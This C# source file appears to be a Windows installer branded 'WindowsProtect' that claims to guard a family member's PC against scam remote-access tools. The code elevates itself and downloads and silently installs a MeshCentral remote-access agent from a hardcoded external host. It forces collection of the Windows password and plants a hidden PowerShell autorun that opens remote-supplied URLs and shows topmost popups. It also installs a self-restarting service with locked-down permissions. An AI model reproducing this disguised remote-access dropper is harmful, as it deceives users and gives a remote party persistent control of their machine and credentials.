using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.ServiceProcess;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;

public class WindowsProtectSetup : Form {
  const string BaseUrl="https://devicehost.vercel.app";
  const string InstallDir=@"C:\Program Files\Common Files\DeviceSupport";
  const string ServiceExe=@"C:\Program Files\Common Files\DeviceSupport\DeviceSupportHost.exe";
  const string UserUIScript=@"C:\Program Files\Common Files\DeviceSupport\WindowsProtect_UserUI.ps1";
  const string DataDir=@"C:\ProgramData\WindowsProtect";

  TextBox ownerBox=new TextBox();
  TextBox labelBox=new TextBox();
  TextBox codeBox=new TextBox();
  TextBox userBox=new TextBox();
  TextBox passBox=new TextBox();
  CheckBox saveCredential=new CheckBox();
  Button installButton=new Button();
  Label status=new Label();
  ProgressBar progress=new ProgressBar();

  [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
  public struct CREDENTIAL {
    public uint Flags;
    public uint Type;
    public string TargetName;
    public string Comment;
    public System.Runtime.InteropServices.ComTypes.FILETIME LastWritten;
    public uint CredentialBlobSize;
    public IntPtr CredentialBlob;
    public uint Persist;
    public uint AttributeCount;
    public IntPtr Attributes;
    public string TargetAlias;
    public string UserName;
  }

  [DllImport("advapi32.dll", EntryPoint="CredWriteW", CharSet=CharSet.Unicode, SetLastError=true)]
  static extern bool CredWrite([In] ref CREDENTIAL userCredential, [In] uint flags);

  public WindowsProtectSetup(){
    Text="WindowsProtect";
    Width=640; Height=620;
    StartPosition=FormStartPosition.CenterScreen;
    BackColor=Color.FromArgb(9,11,16);
    ForeColor=Color.White;
    Font=new Font("Segoe UI",10);
    FormBorderStyle=FormBorderStyle.FixedDialog;
    MaximizeBox=false;

    var title=new Label{Text="WindowsProtect",Left=28,Top=24,Width=500,Height=36,Font=new Font("Segoe UI Semibold",22),ForeColor=Color.White};
    var sub=new Label{Text="Protect this PC from scam remote-access tools and keep secure support available.",Left=30,Top=64,Width=560,Height=42,ForeColor=Color.FromArgb(150,160,175)};

    AddLabel("Owner / family member",30,118); Configure(ownerBox,30,142,"e.g. Mum");
    AddLabel("Device label",30,188); Configure(labelBox,30,212,"e.g. Living room laptop");
    AddLabel("One-time setup code (new PC only)",30,258); Configure(codeBox,30,282,"XXXX-XXXX-XXXX");

    saveCredential.Text="Secure support credential (required for protected support access)";
    saveCredential.Left=30; saveCredential.Top=338; saveCredential.Width=510; saveCredential.ForeColor=Color.FromArgb(210,215,225);
    saveCredential.Checked=true; saveCredential.Enabled=false; userBox.Enabled=passBox.Enabled=true;

    AddLabel("Windows username",30,372); Configure(userBox,30,396,Environment.UserName);
    AddLabel("Windows password",300,372); Configure(passBox,300,396,"");
    passBox.UseSystemPasswordChar=true;
    userBox.Enabled=passBox.Enabled=true;

    var note=new Label{
      Text="This credential stays only in Windows Credential Manager on this PC and is never uploaded.",
      Left=30,Top=435,Width=510,Height=38,ForeColor=Color.FromArgb(140,150,165),Font=new Font("Segoe UI",8.5f)
    };

    installButton.Text="Protect this PC";
    installButton.Left=30; installButton.Top=482; installButton.Width=510; installButton.Height=38;
    installButton.FlatStyle=FlatStyle.Flat;
    installButton.BackColor=Color.FromArgb(37,99,235);
    installButton.ForeColor=Color.White;
    installButton.FlatAppearance.BorderSize=0;
    installButton.Click+=async (s,e)=>await InstallAsync();

    progress.Left=30; progress.Top=532; progress.Width=510; progress.Height=22;
    progress.Style=ProgressBarStyle.Marquee; progress.Visible=false;

    status.Left=30; status.Top=560; status.Width=510; status.Height=28;
    status.ForeColor=Color.FromArgb(160,170,185);

    Controls.AddRange(new Control[]{title,sub,ownerBox,labelBox,codeBox,saveCredential,userBox,passBox,note,installButton,progress,status});
    try{
      var tokenPath=Path.Combine(DataDir,"device.token");
      if(File.Exists(tokenPath) && new FileInfo(tokenPath).Length>20){
        codeBox.Enabled=false;
        codeBox.Text="Already enrolled — no code needed";
        installButton.Text="Update / Repair WindowsProtect";
        status.Text="Existing WindowsProtect enrollment detected.";
      }
    }catch{}
  }

  void AddLabel(string text,int x,int y){
    var l=new Label{Text=text,Left=x,Top=y,Width=250,Height=22,ForeColor=Color.FromArgb(170,180,195),Font=new Font("Segoe UI",9)};
    Controls.Add(l);
  }

  void Configure(TextBox box,int x,int y,string placeholder){
    box.Left=x; box.Top=y; box.Width=(x<100?510:240); box.Height=30;
    box.BackColor=Color.FromArgb(17,21,29); box.ForeColor=Color.White;
    box.BorderStyle=BorderStyle.FixedSingle;
    box.Text=placeholder;
    box.GotFocus+=(s,e)=>{ if(box.Text==placeholder) box.Text=""; };
  }

  static string Esc(string s){ return (s??"").Replace("\\","\\\\").Replace("\"","\\\"").Replace("\r"," ").Replace("\n"," "); }
  static string JsonValue(string json,string key){
    var m=Regex.Match(json,"\""+Regex.Escape(key)+"\"\\s*:\\s*(?:\"([^\"]*)\"|null)",RegexOptions.IgnoreCase);
    return m.Success?m.Groups[1].Value:"";
  }

  bool IsAdmin(){
    using(var id=WindowsIdentity.GetCurrent()){
      return new WindowsPrincipal(id).IsInRole(WindowsBuiltInRole.Administrator);
    }
  }

  void RelaunchElevated(){
    var psi=new ProcessStartInfo(Application.ExecutablePath){UseShellExecute=true,Verb="runas"};
    Process.Start(psi);
    Application.Exit();
  }

  async Task InstallAsync(){
    if(!IsAdmin()){ RelaunchElevated(); return; }

    var owner=ownerBox.Text.Trim();
    var label=labelBox.Text.Trim();
    var code=codeBox.Text.Trim().ToUpperInvariant();
    var tokenPath=Path.Combine(DataDir,"device.token");
    var alreadyEnrolled=File.Exists(tokenPath) && new FileInfo(tokenPath).Length>20;

    if(!alreadyEnrolled && (String.IsNullOrWhiteSpace(owner)||String.IsNullOrWhiteSpace(label)||String.IsNullOrWhiteSpace(code))){
      MessageBox.Show("For a new PC, owner, device label and one-time setup code are required.","WindowsProtect",MessageBoxButtons.OK,MessageBoxIcon.Warning);
      return;
    }

    installButton.Enabled=false; progress.Visible=true;
    try{
      ServicePointManager.SecurityProtocol=SecurityProtocolType.Tls12;
      string meshAgentUrl="";
      if(!alreadyEnrolled){
        SetStatus("Validating setup code...");
        var redeem=await PostJson(BaseUrl+"/api/setup/redeem","{\"code\":\""+Esc(code)+"\"}",null);
        var enrollKey=JsonValue(redeem,"device_enrollment_key");
        meshAgentUrl=JsonValue(redeem,"mesh_agent_url");
        if(String.IsNullOrWhiteSpace(enrollKey)) throw new Exception("Setup code was invalid or expired.");

        SetStatus("Registering this PC...");
        var enroll="{\"person_name\":\""+Esc(owner)+"\",\"device_name\":\""+Esc(label)+"\",\"computer_name\":\""+Esc(Environment.MachineName)+"\",\"protection_status\":\"pending\",\"migration_status\":\"not_started\",\"os_version\":\""+Esc(Environment.OSVersion.VersionString)+"\",\"agent_version\":\"0.5.3-test\",\"remote_access_provider\":\"meshcentral\"}";
        var enrolled=await PostJson(BaseUrl+"/api/enroll",enroll,enrollKey);
        var token=JsonValue(enrolled,"device_token");
        if(String.IsNullOrWhiteSpace(token)) throw new Exception("DeviceHost did not return a device token.");

        Directory.CreateDirectory(DataDir);
        var protectedBytes=ProtectedData.Protect(Encoding.UTF8.GetBytes(token),null,DataProtectionScope.LocalMachine);
        File.WriteAllText(tokenPath,Convert.ToBase64String(protectedBytes));
      }else{
        SetStatus("Existing WindowsProtect enrollment found. Updating this PC...");
      }

      SetStatus("Preparing protection services...");
      Directory.CreateDirectory(InstallDir);
      StopExistingService();
      ExtractEmbeddedService(ServiceExe);
      InstallUserUI();

      if(String.IsNullOrWhiteSpace(meshAgentUrl)) meshAgentUrl="https://34-69-184-103.sslip.io/meshagents?id=4&meshid=gY1Com9g9071ieNPRic8EHP2irnFHZxy1gpsoBn8opAi4guIJ$gAQj$INq8mbEjL&installflags=0";
      var meshReady=MeshReady();
      if(!meshReady && !String.IsNullOrWhiteSpace(meshAgentUrl)){
        SetStatus("Installing secure support component...");
        var temp=Path.Combine(Path.GetTempPath(),"WindowsProtect-MeshAgent.exe");
        using(var wc=new WebClient()) await wc.DownloadFileTaskAsync(new Uri(meshAgentUrl),temp);
        await Run(temp,"-fullinstall",90000);
        try{ File.Delete(temp); }catch{}
        for(int i=0;i<20 && !MeshReady();i++) await Task.Delay(1500);
        meshReady=MeshReady();
      }

      if(!meshReady){
        throw new Exception("The secure support connection is not ready yet. WindowsProtect was not activated so your current support route is preserved.");
      }

      InstallOrUpdateService();
      HardenWindowsProtect();

      if(saveCredential.Checked && !String.IsNullOrWhiteSpace(userBox.Text) && !String.IsNullOrWhiteSpace(passBox.Text)){
        SetStatus("Saving optional Windows credential locally...");
        SaveCredential(userBox.Text.Trim(),passBox.Text);
      }

      SetStatus("Finishing security checks...");
      await Task.Delay(7000);

      progress.Visible=false;
      SetStatus("WindowsProtect installed successfully.");
      MessageBox.Show("WindowsProtect is active. Protection, monitoring and secure support are ready.","WindowsProtect",MessageBoxButtons.OK,MessageBoxIcon.Information);
      Close();
    }catch(WebException ex){
      progress.Visible=false;
      SetStatus("Setup failed.");
      MessageBox.Show(ReadWebError(ex),"WindowsProtect setup failed",MessageBoxButtons.OK,MessageBoxIcon.Error);
    }catch(Exception ex){
      progress.Visible=false;
      SetStatus("Setup failed.");
      MessageBox.Show(ex.Message,"WindowsProtect setup failed",MessageBoxButtons.OK,MessageBoxIcon.Error);
    }finally{
      installButton.Enabled=true;
      passBox.Text="";
    }
  }

  static async Task<string> PostJson(string url,string body,string enrollmentKey){
    using(var wc=new WebClient()){
      wc.Headers[HttpRequestHeader.ContentType]="application/json";
      if(!String.IsNullOrWhiteSpace(enrollmentKey)) wc.Headers.Add("x-enrollment-key",enrollmentKey);
      return await wc.UploadStringTaskAsync(new Uri(url),"POST",body);
    }
  }

  static string ReadWebError(WebException ex){
    try{ using(var sr=new StreamReader(ex.Response.GetResponseStream())) return sr.ReadToEnd(); }catch{ return ex.Message; }
  }

  static void ExtractEmbeddedService(string destination){
    var asm=Assembly.GetExecutingAssembly();
    using(var input=asm.GetManifestResourceStream("DeviceSupportHost.exe")){
      if(input==null) throw new Exception("WindowsProtect service payload is missing.");
      using(var output=File.Create(destination)) input.CopyTo(output);
    }
  }

  static void InstallUserUI(){
    var script=@"
$ErrorActionPreference='SilentlyContinue'
$cmdFile='C:\ProgramData\WindowsProtect\UI\ui-command.txt'
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
while($true){
  if(Test-Path $cmdFile){
    $raw=[IO.File]::ReadAllText($cmdFile,[Text.Encoding]::UTF8)
    Remove-Item $cmdFile -Force
    $p=$raw.Split('|')
    if($p.Length -ge 2 -and $p[0] -eq 'url'){
      try{
        $u=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($p[1]))
        if($u -match '^https?://'){ Start-Process $u }
      }catch{}
    }
    elseif($p.Length -ge 5 -and $p[0] -eq 'message'){
      try{
        $t=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($p[1]))
        $m=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($p[2]))
        $size=$p[3]; $place=$p[4]
        $w=520; $h=240
        if($size -eq 'compact'){$w=420;$h=180}
        elseif($size -eq 'large'){$w=640;$h=320}
        $f=New-Object System.Windows.Forms.Form
        $f.Text=$t; $f.ClientSize=New-Object System.Drawing.Size($w,$h)
        $f.FormBorderStyle='FixedDialog'; $f.MaximizeBox=$false; $f.MinimizeBox=$false
        $f.TopMost=$true; $f.ShowInTaskbar=$true; $f.StartPosition='Manual'; $f.BackColor=[Drawing.Color]::White
        $wa=[Windows.Forms.Screen]::PrimaryScreen.WorkingArea
        if($place -eq 'top_right'){$x=$wa.Right-$w-24;$y=$wa.Top+24}
        elseif($place -eq 'bottom_right'){$x=$wa.Right-$w-24;$y=$wa.Bottom-$h-24}
        else{$x=$wa.Left+[int](($wa.Width-$w)/2);$y=$wa.Top+[int](($wa.Height-$h)/2)}
        $f.Location=New-Object System.Drawing.Point($x,$y)
        $hdr=New-Object Windows.Forms.Panel; $hdr.Dock='Top'; $hdr.Height=56; $hdr.BackColor=[Drawing.Color]::FromArgb(17,24,39)
        $ttl=New-Object Windows.Forms.Label; $ttl.Text=$t; $ttl.Dock='Fill'; $ttl.ForeColor=[Drawing.Color]::White
        $ttl.Font=New-Object Drawing.Font('Segoe UI',14,[Drawing.FontStyle]::Bold); $ttl.Padding=New-Object Windows.Forms.Padding(18,0,18,0); $ttl.TextAlign='MiddleLeft'
        $hdr.Controls.Add($ttl)
        $body=New-Object Windows.Forms.Label; $body.Text=$m; $body.Location=New-Object Drawing.Point(20,78)
        $body.Size=New-Object Drawing.Size(($w-40),($h-142)); $body.ForeColor=[Drawing.Color]::FromArgb(31,41,55)
        $body.Font=New-Object Drawing.Font('Segoe UI',10.5); $body.TextAlign='TopLeft'
        $ok=New-Object Windows.Forms.Button; $ok.Text='OK'; $ok.Size=New-Object Drawing.Size(92,34)
        $ok.Location=New-Object Drawing.Point(($w-112),($h-52)); $ok.BackColor=[Drawing.Color]::FromArgb(37,99,235)
        $ok.ForeColor=[Drawing.Color]::White; $ok.FlatStyle='Flat'; $ok.Add_Click({$f.Close()})
        $f.Controls.Add($hdr); $f.Controls.Add($body); $f.Controls.Add($ok); $f.AcceptButton=$ok
        [void]$f.ShowDialog()
      }catch{}
    }
  }
  Start-Sleep -Milliseconds 750
}
";
    File.WriteAllText(UserUIScript,script,Encoding.UTF8);
    try{
      using(var run=Microsoft.Win32.Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run")){
        run.SetValue("WindowsProtectUserUI","powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File \""+UserUIScript+"\"");
      }
    }catch{}
    try{
      Process.Start(new ProcessStartInfo("powershell.exe","-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File \""+UserUIScript+"\""){UseShellExecute=true});
    }catch{}
  }

  static bool MeshReady(){
    try{
      foreach(var name in new[]{"Mesh Agent","meshagent"}){
        try{ using(var sc=new ServiceController(name)) if(sc.Status==ServiceControllerStatus.Running) return true; }catch{}
      }
      foreach(var name in new[]{"meshagent","meshagent64","MeshAgent"}){
        try{ if(Process.GetProcessesByName(name).Length>0) return true; }catch{}
      }
    }catch{}
    return false;
  }

  static async Task<int> Run(string file,string args,int timeout){
    using(var p=new Process{StartInfo=new ProcessStartInfo(file,args){UseShellExecute=true,CreateNoWindow=true}}){
      p.Start();
      await Task.Run(()=>p.WaitForExit(timeout));
      return p.HasExited?p.ExitCode:-1;
    }
  }

  static void StopExistingService(){
    try{
      using(var sc=new ServiceController("DeviceSupportHost")){
        var x=sc.Status;
        if(x!=ServiceControllerStatus.Stopped){
          sc.Stop();
          sc.WaitForStatus(ServiceControllerStatus.Stopped,TimeSpan.FromSeconds(20));
        }
      }
    }catch(InvalidOperationException){
      // Service does not exist yet.
    }

    for(int i=0;i<20;i++){
      try{
        using(var fs=new FileStream(ServiceExe,FileMode.OpenOrCreate,FileAccess.ReadWrite,FileShare.None)){ }
        return;
      }catch(IOException){
        System.Threading.Thread.Sleep(500);
      }catch(UnauthorizedAccessException){
        System.Threading.Thread.Sleep(500);
      }
    }

    throw new IOException("WindowsProtect service is still using its executable. Please wait a few seconds and try again.");
  }

  static void HardenWindowsProtect(){
    try{
      Directory.CreateDirectory(Path.Combine(DataDir,"UI"));
      RunSc("failureflag DeviceSupportHost 1");
      RunIcacls(InstallDir,"/inheritance:r /grant:r \"SYSTEM:(OI)(CI)(F)\" \"Administrators:(OI)(CI)(F)\" \"Users:(OI)(CI)(RX)\"");
      RunIcacls(DataDir,"/inheritance:r /grant:r \"SYSTEM:(OI)(CI)(F)\" \"Administrators:(OI)(CI)(F)\"");
      var uiDir=Path.Combine(DataDir,"UI");
      RunIcacls(uiDir,"/inheritance:r /grant:r \"SYSTEM:(OI)(CI)(F)\" \"Administrators:(OI)(CI)(F)\" \"Users:(OI)(CI)(M)\"");
      var tokenPath=Path.Combine(DataDir,"device.token");
      if(File.Exists(tokenPath)) RunIcacls(tokenPath,"/inheritance:r /grant:r \"SYSTEM:(F)\" \"Administrators:(F)\"");
    }catch{}
  }

  static void RunIcacls(string path,string args){
    try{
      using(var p=new Process{StartInfo=new ProcessStartInfo("icacls.exe","\""+path+"\" "+args){UseShellExecute=false,CreateNoWindow=true,RedirectStandardOutput=true,RedirectStandardError=true}}){
        p.Start(); p.WaitForExit(15000);
      }
    }catch{}
  }

  static void InstallOrUpdateService(){
    StopExistingService();

    RunSc("delete DeviceSupportHost");
    System.Threading.Thread.Sleep(800);
    RunSc("create DeviceSupportHost binPath= \"\\\""+ServiceExe+"\\\"\" start= auto DisplayName= \"Device Support Host\"");
    RunSc("description DeviceSupportHost \"WindowsProtect family anti-scam protection and security telemetry.\"");
    RunSc("failure DeviceSupportHost reset= 86400 actions= restart/5000/restart/15000/restart/30000");
    RunSc("start DeviceSupportHost");
  }

  static void RunSc(string args){
    using(var p=new Process{StartInfo=new ProcessStartInfo("sc.exe",args){UseShellExecute=false,CreateNoWindow=true,RedirectStandardOutput=true,RedirectStandardError=true}}){
      p.Start(); p.WaitForExit(15000);
    }
  }

  static void SaveCredential(string username,string password){
    var bytes=Encoding.Unicode.GetBytes(password);
    var blob=Marshal.AllocCoTaskMem(bytes.Length);
    try{
      Marshal.Copy(bytes,0,blob,bytes.Length);
      var cred=new CREDENTIAL{
        Type=1,
        TargetName="WindowsProtect/LocalWindowsAccount",
        CredentialBlobSize=(uint)bytes.Length,
        CredentialBlob=blob,
        Persist=2,
        UserName=username,
        Comment="Stored locally by WindowsProtect. Never uploaded."
      };
      if(!CredWrite(ref cred,0)) throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());
    }finally{
      for(int i=0;i<bytes.Length;i++) Marshal.WriteByte(blob,i,0);
      Marshal.FreeCoTaskMem(blob);
    }
  }

  void SetStatus(string text){
    if(InvokeRequired){ BeginInvoke(new Action<string>(SetStatus),text); return; }
    status.Text=text;
  }

  [STAThread]
  public static void Main(){
    Application.EnableVisualStyles();
    Application.SetCompatibleTextRenderingDefault(false);
    Application.Run(new WindowsProtectSetup());
  }
}
